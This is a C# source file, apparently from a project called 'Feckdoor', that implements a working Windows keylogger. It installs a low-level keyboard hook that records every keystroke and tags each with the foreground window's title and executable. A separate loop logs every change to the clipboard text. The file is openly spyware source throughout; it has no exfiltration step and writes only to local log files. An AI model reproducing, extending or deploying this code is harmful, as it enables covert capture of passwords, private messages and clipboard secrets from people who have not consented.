using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

namespace Feckdoor
{
	internal static class Program
	{
		private static string LogFile = @"D:\Cache\Feckdoor.log";
		private static string ErrorLogFile = @"D:\Cache\FeckdoorError.log";

		private static ActiveWindowInfo ActiveWindowStringCache = new ActiveWindowInfo { Name = "Unknown", Executable = "Unknown" };
		private static IntPtr HookID = IntPtr.Zero;

		private static string ClipboardTextCache = "";


		static void Main(string[] args)
		{
			try
			{
				Config config = new Config();

				string configPath = Path.Combine(Environment.CurrentDirectory, "config.json");
				if (File.Exists(configPath))
				{
					var tmp = JsonSerializer.Deserialize<Config>(File.ReadAllText(configPath));
					if (tmp != null)
						config = tmp;
				}
				else
					File.WriteAllText(configPath, Properties.Resources.DefaultConfig);

				LogFile = config.LogFile;
				ErrorLogFile = config.ErrorLogFile;

				HookID = InstallHook(KeyboardHook);
				Task.Run(async () => await ClipboardSpy());
				Application.Run();
				User32.UnhookWindowsHookEx(HookID);
			}
			catch (Exception ex)
			{
				File.AppendAllText(ErrorLogFile, $"Main thread error: {ex}\n");
			}
		}

		private async static Task ClipboardSpy()
		{
			while (true)
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (ClipboardTextCache != text)
					{
						using (var writer = new StreamWriter(LogFile, true))
						{
							try
							{
								writer.WriteLine(Environment.NewLine);
								writer.WriteLine("> Clipboard text changed");
								writer.WriteLine("New content: " + text);
							}
							catch (Exception e)
							{
								File.AppendAllText(ErrorLogFile, $"Clipboard spy error: {e}\n");
							}
						}
					}
					ClipboardTextCache = text;
				}
				else
					ClipboardTextCache = "";
				await Task.Delay(100);
			}
		}

		private static IntPtr InstallHook(User32.LowLevelKeyboardProc proc)
		{
			using Process process = Process.GetCurrentProcess();
			using ProcessModule? module = process.MainModule;
			if (module == null)
				return IntPtr.Zero;
			return User32.SetWindowsHookEx(User32.WH_KEYBOARD_LL, proc, module.BaseAddress, 0);
		}

		private static IntPtr KeyboardHook(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && wParam == (IntPtr)User32.WM_KEYDOWN)
			{
				try
				{
					int vkCode = Marshal.ReadInt32(lParam);
					int scanCode = Marshal.ReadInt32(lParam + 32);
					bool capsLock = (User32.GetKeyState(0x14) & 0xffff) != 0;
					bool shiftPress = (User32.GetKeyState(0xA0) & 0x8000) != 0 || (User32.GetKeyState(0xA1) & 0x8000) != 0;
					string currentKey = Vk2String((uint)vkCode, (uint)scanCode);

					if (capsLock ^ shiftPress)
						currentKey = currentKey.ToUpper();
					else
						currentKey = currentKey.ToLower();

					if (((VkCode)vkCode).GetVkName(shiftPress, ref currentKey))
					{
						if (currentKey == "CapsLock")
						{
							if (capsLock)
								currentKey = "CAPSLOCK: OFF";
							else
								currentKey = "CAPSLOCK: ON";
						}
					}

					if (currentKey.Length > 1)
						currentKey = $"[{currentKey}]";

					bool lineChange = currentKey.Equals("[Enter]", StringComparison.InvariantCultureIgnoreCase);

					// Write keys
					using (var writer = new StreamWriter(LogFile, true))
					{
						try
						{
							if (ActiveWindowStringCache != ActiveWindowToString())
							{
								writer.WriteLine(Environment.NewLine);
								writer.WriteLine("> Active window changed");
								writer.WriteLine("Name: " + ActiveWindowStringCache.Name);
								writer.WriteLine("Executable: " + ActiveWindowStringCache.Executable);
								writer.WriteLine();
							}
							if (lineChange)
								writer.WriteLine(currentKey);
							else
								writer.Write(currentKey);

						}
						catch (Exception e)
						{
							File.AppendAllText(ErrorLogFile, $"Keylogger keystroke write error: {e}{Environment.NewLine}");
						}
					}
				}
				catch (Exception e)
				{
					File.AppendAllText(ErrorLogFile, $"Keylogger hook error: {e}{Environment.NewLine}");
				}
			}

			// Keep running the hook chain
			return User32.CallNextHookEx(HookID, nCode, wParam, lParam);
		}

		private static string Vk2String(uint vkCode, uint scanCode)
		{
			try
			{
				byte[] vkBuffer = new byte[256];
				if (!User32.GetKeyboardState(vkBuffer))
					return ""; // Keyboard state unavailable

				StringBuilder sb = new StringBuilder(256);
				int bufferLen = User32.ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 256, 0, User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), out uint processId)));
				if (bufferLen != 0)
				{
					if (bufferLen < 0)
						bufferLen = int.MaxValue; // Prevent negative index access on .Take(n)
					return sb.ToString().Take(bufferLen).ToString(); // If unicode value of key available, return it.
				}
			}
			catch { }

			// If unicode value of key unavailable or an error occurred.
			return ((VkCode)vkCode).ToString();
		}

		private static ActiveWindowInfo ActiveWindowToString()
		{
			try
			{
				// Acquire forground window handle
				IntPtr hwnd = User32.GetForegroundWindow();

				// Acquire foreground window thread id bu window id
				User32.GetWindowThreadProcessId(hwnd, out uint pid);

				// Acquire foreground process id by thread id
				Process p = Process.GetProcessById((int)pid);
				ActiveWindowStringCache = new ActiveWindowInfo { Name = p.MainWindowTitle, Executable = p.MainModule?.FileName ?? p.ProcessName };
				return ActiveWindowStringCache;
			}
			catch (Exception)
			{
				return new ActiveWindowInfo { Name = "Errored", Executable = "Errored" };
			}
		}
	}
}